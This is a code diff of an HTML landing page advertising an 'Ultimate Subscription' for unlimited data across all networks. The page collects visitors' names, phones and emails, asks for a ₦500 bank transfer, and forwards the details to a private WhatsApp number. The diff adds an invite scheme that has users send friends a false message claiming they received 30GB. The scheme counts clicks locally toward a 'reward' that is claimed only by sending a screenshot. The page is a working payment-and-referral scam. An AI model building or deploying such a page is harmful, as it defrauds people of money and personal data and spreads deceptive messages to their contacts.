@@ -3,12 +3,13 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Unlimited data</title>
+<title>Ultimate Subscription</title>
 <style>
   :root{
     --brand-green:#0a8f5a;
     --white:#ffffff;
     --muted-bg:#f4f4f4;
+    --accent-blue:#1e90ff;
   }
   *{box-sizing:border-box}
   body{
@@ -45,26 +46,31 @@
   }
   .hero p{max-width:800px;margin:0 auto 18px;color:rgba(255,255,255,0.95)}
   .btn{
-    background:#fff;color:var(--brand-green);padding:12px 26px;border-radius:6px;font-weight:700;cursor:pointer;display:inline-block;
+    background:#fff;color:var(--brand-green);padding:12px 26px;border-radius:6px;font-weight:700;cursor:pointer;display:inline-block;border:none;
+  }
+  .btn.secondary{
+    margin-left:12px;
+    background:transparent;
+    border:1px solid rgba(255,255,255,0.18);
+    color:#fff;
+    padding:10px 16px;
+    border-radius:6px;
+    cursor:pointer;
   }
 
-  /* images grid */
-  .images-wrap{background:var(--muted-bg);padding:36px 20px;}
-  .images{
-    display:grid;
-    grid-template-columns:repeat(3,1fr);
-    gap:20px;
-    max-width:1000px;
-    margin:0 auto;
-  }
-  .images img{
-    width:100%;
-    aspect-ratio:1/1;
-    object-fit:cover;
-    border-radius:8px;
-    box-shadow:0 6px 18px rgba(0,0,0,0.08);
-    display:block;
-  }
+  .images-wrap{background:var(--muted-bg);padding:36px 20px}
+  .images{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;max-width:1000px;margin:0 auto}
+  .images img{width:100%;aspect-ratio:1/1;object-fit:cover;border-radius:8px;box-shadow:0 6px 18px rgba(0,0,0,0.08);display:block}
+
+  /* progress UI */
+  #inviteProgressWrap{max-width:420px;margin:18px auto 0;display:none}
+  #inviteProgressWrap .title{font-weight:700;color:#fff;margin-bottom:8px}
+  #inviteProgressWrap .track{background:rgba(255,255,255,0.12);border-radius:8px;padding:4px}
+  #inviteProgressBar{width:0%;height:14px;background:var(--accent-blue);border-radius:6px;transition:width .18s linear}
+  #inviteProgressText{color:#fff;margin-top:8px;font-size:13px;text-align:center}
+
+  /* claim area */
+  #inviteClaimWrap{max-width:420px;margin:12px auto 30px;display:none;text-align:center}
 
   /* modal and loader */
   .modal-bg, .loader {
@@ -78,43 +84,47 @@
   }
   .modal-bg{background:rgba(0,0,0,0.6)}
   .modal{
-    background:#fff;color:#000;padding:20px;border-radius:12px;width:92%;max-width:480px;
-    box-shadow:0 20px 40px rgba(0,0,0,0.25);
+    background:#fff;color:#000;padding:20px;border-radius:12px;width:92%;max-width:520px;box-shadow:0 20px 40px rgba(0,0,0,0.25);
   }
   .modal h3{margin:0 0 10px;font-size:18px}
   .modal label{display:block;margin:8px 0 6px;color:#333;font-size:13px}
-  .modal input,.modal select{
-    width:100%;padding:10px;border:1px solid #ddd;border-radius:8px;font-size:14px;
-  }
+  .modal input,.modal select{width:100%;padding:10px;border:1px solid #ddd;border-radius:8px;font-size:14px}
   .modal .actions{display:flex;gap:10px;justify-content:flex-end;margin-top:14px}
   .modal button{padding:10px 14px;border-radius:8px;border:none;cursor:pointer;font-weight:700}
   .primary{background:var(--brand-green);color:#fff}
   .secondary{background:#e0e0e0;color:#111}
-  .loader{background:var(--brand-green);color:#fff;font-size:18px}
+  .loader{background:var(--brand-green);color:#fff;font-size:18px;padding:12px 20px;border-radius:8px}
 
-  /* small screens */
-  @media (max-width:720px){
-    .images{grid-template-columns:repeat(2,1fr)}
+  /* claim button style */
+  #inviteClaimWrap .claim-btn{
+    background:var(--accent-blue);
+    color:#fff;
+    border-radius:8px;
+    padding:10px 18px;
+    border:none;
+    cursor:pointer;
+    font-weight:700;
   }
-  @media (max-width:420px){
-    .images{grid-template-columns:1fr}
-    .hero h1{font-size:20px}
-  }
+
+  @media (max-width:720px){.images{grid-template-columns:repeat(2,1fr)}}
+  @media (max-width:420px){.images{grid-template-columns:1fr}.hero h1{font-size:20px}}
 </style>
 </head>
 <body>
 <header>
-  <h2>Unlimited data</h2>
+  <h2>Ultimate Subscription</h2>
   <nav>
     <a href="about.html">About</a>
     <a href="contact.html">Contact Us</a>
+    <a id="inviteHeader" style="background:#fff;color:var(--brand-green);padding:8px 12px;border-radius:6px;margin-left:12px;text-decoration:none;font-weight:700">Invite</a>
   </nav>
 </header>
 
 <section class="hero">
-  <h1>Unlimited ultimate Subscription for All Networks</h1>
+  <h1>Ultimate Subscription for All Networks</h1>
   <p>Browse anything, anywhere, anytime. One subscription that works across all networks.</p>
   <button id="applyNowBtn" class="btn" type="button">Apply Now</button>
+  <button id="inviteHeroBtn" class="btn secondary" type="button">Invite Friends for 30GB</button>
 </section>
 
 <section class="images-wrap" aria-label="Gallery">
@@ -125,7 +135,21 @@
   </div>
 </section>
 
-<!-- modal container (hidden until used) -->
+<!-- Invite progress UI -->
+<div id="inviteProgressWrap" aria-hidden="true">
+  <div class="title">Invite Progress</div>
+  <div class="track">
+    <div id="inviteProgressBar"></div>
+  </div>
+  <div id="inviteProgressText">0 / 20 invites</div>
+</div>
+
+<!-- Claim area (appears when progress complete) -->
+<div id="inviteClaimWrap" aria-hidden="true">
+  <button id="claimBtn" class="claim-btn">Claim 30GB</button>
+</div>
+
+<!-- modal container -->
 <div id="modal" class="modal-bg" aria-hidden="true"></div>
 
 <!-- loader -->
@@ -134,30 +158,30 @@
 </div>
 
 <script>
-(function(){
-  // store submitted form data for confirm redirect
+(function () {
+  // --- Core form & apply logic (keeps previous behavior) ---
   let submittedData = null;
-
-  // references
   const modalBg = document.getElementById('modal');
   const loader = document.getElementById('loader');
   const applyNowBtn = document.getElementById('applyNowBtn');
 
-  // open form modal
-  function openApplyForm(){
-    // build form HTML
+  applyNowBtn.style.pointerEvents = 'auto';
+  applyNowBtn.addEventListener('click', openApplyForm);
+  applyNowBtn.onclick = openApplyForm;
+
+  function openApplyForm() {
     modalBg.innerHTML = `
       <div class="modal" role="dialog" aria-modal="true" aria-labelledby="formTitle">
         <h3 id="formTitle">Ultimate Subscription Registration</h3>
 
         <label for="name">Name</label>
-        <input id="name" name="name" type="text" placeholder="Full name" />
+        <input id="name" name="name" type="text" placeholder="Full name" autocomplete="name" />
 
         <label for="phone">Phone Number</label>
-        <input id="phone" name="phone" type="tel" placeholder="+2347031935351" />
+        <input id="phone" name="phone" type="tel" placeholder="+2348012345678" autocomplete="tel" />
 
         <label for="email">Email</label>
-        <input id="email" name="email" type="email" placeholder="you@example.com" />
+        <input id="email" name="email" type="email" placeholder="you@example.com" autocomplete="email" />
 
         <label for="network">Network</label>
         <select id="network" name="network">
@@ -176,19 +200,17 @@
         <hr style="margin:14px 0;border:none;border-top:1px solid #eee" />
 
         <p style="margin:8px 0"><strong>Payment Amount: ₦500</strong></p>
-        <p style="margin:0;color:#333">Account Number: <strong>2040541530</strong><br>
-        Account Name: <strong>Igwekalu</strong><br>
-        Bank: <strong>Kuda</strong></p>
+        <p style="margin:0;color:#333">Account Number: <strong>1234567890</strong><br>
+        Account Name: <strong>Ultimate Sub Ltd</strong><br>
+        Bank: <strong>Access Bank</strong></p>
       </div>
     `;
 
-    // show modal
     modalBg.style.display = 'flex';
     modalBg.style.alignItems = 'center';
     modalBg.style.justifyContent = 'center';
-    modalBg.setAttribute('aria-hidden','false');
+    modalBg.setAttribute('aria-hidden', 'false');
 
-    // wire up elements after insertion
     const nameEl = document.getElementById('name');
     const phoneEl = document.getElementById('phone');
     const emailEl = document.getElementById('email');
@@ -196,52 +218,46 @@
     const applyBtn = document.getElementById('applyBtn');
     const cancelBtn = document.getElementById('cancelBtn');
 
-    // validation function
-    function validate(){
+    function validate() {
       const name = nameEl.value.trim();
       const phone = phoneEl.value.trim();
       const email = emailEl.value.trim();
       const network = networkEl.value.trim();
-      // basic checks: non-empty; email contains @; phone length > 6
       const emailOk = email.length > 3 && email.includes('@');
       const phoneOk = phone.length >= 7;
       const ok = name && phoneOk && emailOk && network;
       applyBtn.disabled = !ok;
     }
 
-    // attach input listeners
-    [nameEl, phoneEl, emailEl, networkEl].forEach(el => {
-      el.addEventListener('input', validate);
-    });
-
-    // cancel closes modal
+    [nameEl, phoneEl, emailEl, networkEl].forEach(el => el.addEventListener('input', validate));
     cancelBtn.addEventListener('click', closeModal);
 
-    // apply click
-    applyBtn.addEventListener('click', function(){
+    applyBtn.addEventListener('click', function () {
       if (applyBtn.disabled) return;
-      // gather data
       submittedData = {
         name: nameEl.value.trim(),
         phone: phoneEl.value.trim(),
         email: emailEl.value.trim(),
         network: networkEl.value.trim()
       };
-      // proceed to submit flow
       closeModal();
       showLoaderThenSuccess();
     });
+
+    modalBg.addEventListener('keydown', function onKey(e) {
+      if (e.key === 'Enter') {
+        if (!applyBtn.disabled) applyBtn.click();
+      }
+    }, { once: true });
   }
 
-  // close modal
-  function closeModal(){
+  function closeModal() {
     modalBg.style.display = 'none';
     modalBg.innerHTML = '';
-    modalBg.setAttribute('aria-hidden','true');
+    modalBg.setAttribute('aria-hidden', 'true');
   }
 
-  // show loader for 2s then show success dialog
-  function showLoaderThenSuccess(){
+  function showLoaderThenSuccess() {
     loader.style.display = 'flex';
     loader.style.alignItems = 'center';
     loader.style.justifyContent = 'center';
@@ -251,8 +267,8 @@
     }, 2000);
   }
 
-  // success dialog with Confirm and Close
-  function showSuccessDialog(){
+  function showSuccessDialog() {
+    if (!submittedData) return;
     modalBg.innerHTML = `
       <div class="modal" role="dialog" aria-modal="true">
         <h3>Application Successful</h3>
@@ -275,46 +291,150 @@
     modalBg.style.display = 'flex';
     modalBg.style.alignItems = 'center';
     modalBg.style.justifyContent = 'center';
-    modalBg.setAttribute('aria-hidden','false');
+    modalBg.setAttribute('aria-hidden', 'false');
 
     document.getElementById('closeBtn').addEventListener('click', closeModal);
-    document.getElementById('confirmBtn').addEventListener('click', function(){
-      // show loader briefly then redirect to WhatsApp with message
+    document.getElementById('confirmBtn').addEventListener('click', function () {
       loader.style.display = 'flex';
       loader.style.alignItems = 'center';
       loader.style.justifyContent = 'center';
       const waMsg = `Ultimate Subscription Registration: Name: ${submittedData.name}; Phone: ${submittedData.phone}; Email: ${submittedData.email}; Network: ${submittedData.network}; Payment: ₦500. I confirm payment proof.`;
-      const waUrl = 'https://wa.me/2347031935351?text=' + encodeURIComponent(waMsg);
-      setTimeout(() => {
-        window.location.href = waUrl;
-      }, 1500);
+      const waUrl = 'https://wa.me/2349168660191?text=' + encodeURIComponent(waMsg);
+      setTimeout(() => { window.location.href = waUrl; }, 1500);
     });
   }
 
-  // small helper to escape HTML
-  function escapeHtml(str){
-    if(!str) return '';
-    return String(str).replace(/[&<>"']/g, function(m){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]; });
-  }
-
-  // attach main button
-  applyNowBtn.addEventListener('click', openApplyForm);
-
-  // close modal when clicking outside the modal content
-  modalBg.addEventListener('click', function(e){
+  // close modal when clicking outside content
+  modalBg.addEventListener('click', function (e) {
     if (e.target === modalBg) closeModal();
   });
 
-  // allow Esc to close modal
-  document.addEventListener('keydown', function(e){
-    if (e.key === 'Escape') {
-      if (modalBg.style.display === 'flex') closeModal();
-    }
+  // Esc closes modal
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape' && modalBg.style.display === 'flex') closeModal();
   });
 
-  // expose navigation helpers (links already point to pages, but keep functions if needed)
-  window.goAbout = function(){ window.location.href = 'about.html'; };
-  window.goContact = function(){ window.location.href = 'contact.html'; };
+  function escapeHtml(str) {
+    if (!str) return '';
+    return String(str).replace(/[&<>"']/g, function (m) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m]; });
+  }
+
+  // --- Invite + Progress + Claim logic ---
+  const INVITES_REQUIRED = 20;
+  const SHARE_LINK = 'https://webryft.github.io/Unlimited-data/';
+  const SHARE_TEXT = "Hi friend — I just received my Ultimate Subscription and got 30GB of fast, unlimited browsing across all networks. It's simple, affordable and works everywhere. Grab yours now:";
+  const STORAGE_KEY = 'ultimate_invite_count';
+
+  const inviteHeader = document.getElementById('inviteHeader');
+  const inviteHeroBtn = document.getElementById('inviteHeroBtn');
+  const progressWrap = document.getElementById('inviteProgressWrap');
+  const progressBar = document.getElementById('inviteProgressBar');
+  const progressText = document.getElementById('inviteProgressText');
+  const claimWrap = document.getElementById('inviteClaimWrap');
+  const claimBtn = document.getElementById('claimBtn');
+
+  let inviteCount = parseInt(sessionStorage.getItem(STORAGE_KEY) || '0', 10);
+
+  function updateInviteUI(){
+    const pct = Math.min(100, Math.round((inviteCount / INVITES_REQUIRED) * 100));
+    progressBar.style.width = pct + '%';
+    progressText.textContent = inviteCount >= INVITES_REQUIRED ? `Goal reached — ${INVITES_REQUIRED} invites!` : `${inviteCount} / ${INVITES_REQUIRED} invites`;
+    progressWrap.style.display = inviteCount > 0 ? 'block' : 'none';
+    if(inviteCount >= INVITES_REQUIRED){
+      claimWrap.style.display = 'block';
+      claimWrap.setAttribute('aria-hidden','false');
+      progressBar.style.width = '100%';
+    } else {
+      claimWrap.style.display = 'none';
+      claimWrap.setAttribute('aria-hidden','true');
+    }
+  }
+  updateInviteUI();
+
+  function doInvite(){
+    // Build message and open WhatsApp share
+    const message = `${SHARE_TEXT} ${SHARE_LINK}`;
+    const waUrl = 'https://wa.me/?text=' + encodeURIComponent(message);
+    window.open(waUrl, '_blank');
+
+    // increment progress
+    inviteCount = Math.min(INVITES_REQUIRED, inviteCount + 1);
+    sessionStorage.setItem(STORAGE_KEY, String(inviteCount));
+    updateInviteUI();
+  }
+
+  if(inviteHeader) inviteHeader.addEventListener('click', doInvite);
+  if(inviteHeroBtn) inviteHeroBtn.addEventListener('click', doInvite);
+
+  // Claim flow
+  if(claimBtn){
+    claimBtn.addEventListener('click', function(){
+      modalBg.innerHTML = `
+        <div class="modal" role="dialog" aria-modal="true">
+          <h3>Claim Your 30GB Reward</h3>
+          <p style="margin:10px 0 12px;color:#333">
+            Amazing — you've completed the invite goal. To claim your <strong>30GB</strong>, please take a screenshot of the filled invite bar as proof, then click <strong>Apply</strong>. Our verification team will confirm and send your reward.
+          </p>
+          <ul style="text-align:left;color:#333;margin:8px 0 12px;padding-left:18px">
+            <li>Step 1: Screenshot the filled invite progress bar.</li>
+            <li>Step 2: Click Apply and then Confirm to open WhatsApp and attach your screenshot.</li>
+            <li>Step 3: Wait for verification — your 30GB will be delivered after confirmation.</li>
+          </ul>
+          <div style="display:flex;gap:10px;justify-content:flex-end;margin-top:12px">
+            <button id="applyClaimBtn" class="primary">Apply</button>
+            <button id="cancelClaimBtn" class="secondary">Cancel</button>
+          </div>
+        </div>
+      `;
+      modalBg.style.display = 'flex';
+      modalBg.style.alignItems = 'center';
+      modalBg.style.justifyContent = 'center';
+      modalBg.setAttribute('aria-hidden','false');
+
+      document.getElementById('cancelClaimBtn').addEventListener('click', closeModal);
+      document.getElementById('applyClaimBtn').addEventListener('click', function(){
+        closeModal();
+        loader.style.display = 'flex';
+        loader.style.alignItems = 'center';
+        loader.style.justifyContent = 'center';
+        setTimeout(() => {
+          loader.style.display = 'none';
+          modalBg.innerHTML = `
+            <div class="modal" role="dialog" aria-modal="true">
+              <h3>Claim Submitted</h3>
+              <p style="margin:10px 0 12px;color:#333">
+                Your claim request has been prepared. Click <strong>Confirm</strong> to open WhatsApp and send your screenshot and details to our verification team. Be sure to attach the screenshot of the filled bar.
+              </p>
+              <div style="display:flex;gap:10px;justify-content:flex-end;margin-top:12px">
+                <button id="confirmClaimBtn" class="primary">Confirm</button>
+                <button id="closeClaimBtn" class="secondary">Close</button>
+              </div>
+            </div>
+          `;
+          modalBg.style.display = 'flex';
+          modalBg.style.alignItems = 'center';
+          modalBg.style.justifyContent = 'center';
+          modalBg.setAttribute('aria-hidden','false');
+
+          document.getElementById('closeClaimBtn').addEventListener('click', closeModal);
+          document.getElementById('confirmClaimBtn').addEventListener('click', function(){
+            const waMsg = `Hello, I am claiming my 30GB reward. My invite progress is complete. Please find my screenshot attached. Thank you.`;
+            const waUrl = 'https://wa.me/2349168660191?text=' + encodeURIComponent(waMsg);
+            window.open(waUrl, '_blank');
+            // Optionally reset progress after claim:
+            // sessionStorage.removeItem(STORAGE_KEY); inviteCount = 0; updateInviteUI();
+          });
+        }, 2000);
+      });
+    });
+  }
+
+  // Expose a refresh function if needed
+  window.__ultimateInvite = {
+    doInvite,
+    getCount: () => inviteCount,
+    reset: () => { inviteCount = 0; sessionStorage.removeItem(STORAGE_KEY); updateInviteUI(); }
+  };
 
 })();
 </script>
